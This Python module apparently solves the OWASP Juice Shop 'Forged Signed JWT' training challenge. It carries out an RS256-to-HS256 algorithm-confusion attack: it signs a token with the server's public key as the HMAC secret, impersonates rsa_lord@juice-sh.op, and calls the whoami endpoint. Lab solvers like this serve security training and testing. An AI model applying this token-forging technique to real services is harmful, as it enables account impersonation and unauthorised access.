from core.base_solver import BaseSolver
import jwt
from loguru import logger

class ForgedSignedJwtSolver(BaseSolver):
    """
    Challenge: Forged Signed JWT (jwtForgedChallenge)
    
    Logic: Algorithm Confusion (RS256 vs HS256).
    Sign a token with HS256 using the server's Public Key as the secret.
    User: rsa_lord@juice-sh.op
    """
    @property
    def challenge_key(self) -> str:
        return "jwtForgedChallenge"

    def solve(self) -> bool:
        # 1. Server's Public Key (from juice-shop-master/encryptionkeys/jwt.pub)
        # Note: Juice Shop uses the full PEM string including headers
        public_key = (
            "-----BEGIN RSA PUBLIC KEY-----\n"
            "MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\n"
            "-----END RSA PUBLIC KEY-----"
        )
        
        # 2. Craft payload
        # According to tests, Juice Shop expects:
        # { "data": { "email": "rsa_lord@juice-sh.op" }, "iat": ..., "exp": ... }
        import json
        import base64
        import hmac
        import hashlib
        import time

        def base64url_encode(data):
            return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "data": {
                "email": "rsa_lord@juice-sh.op"
            },
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600*24
        }
        
        segments = [
            base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8')),
            base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
        ]
        
        signing_input = ".".join(segments).encode('utf-8')
        signature = hmac.new(public_key.encode('utf-8'), signing_input, hashlib.sha256).digest()
        
        token = ".".join(segments + [base64url_encode(signature)])
        
        # 4. Use token in request
        headers = {"Authorization": f"Bearer {token}"}
        res = self.client.get("/rest/user/whoami", headers=headers)
        
        if res.status_code == 200:
            logger.success("Forged signed JWT accepted")
            return True
        else:
            # Maybe the sub-domain matters? The test had "rsa_lord@" (regex /rsa_lord@/)
            # Let's try again if it fails with full email
            logger.warning(f"Failed with full email: {res.status_code}")
            return False
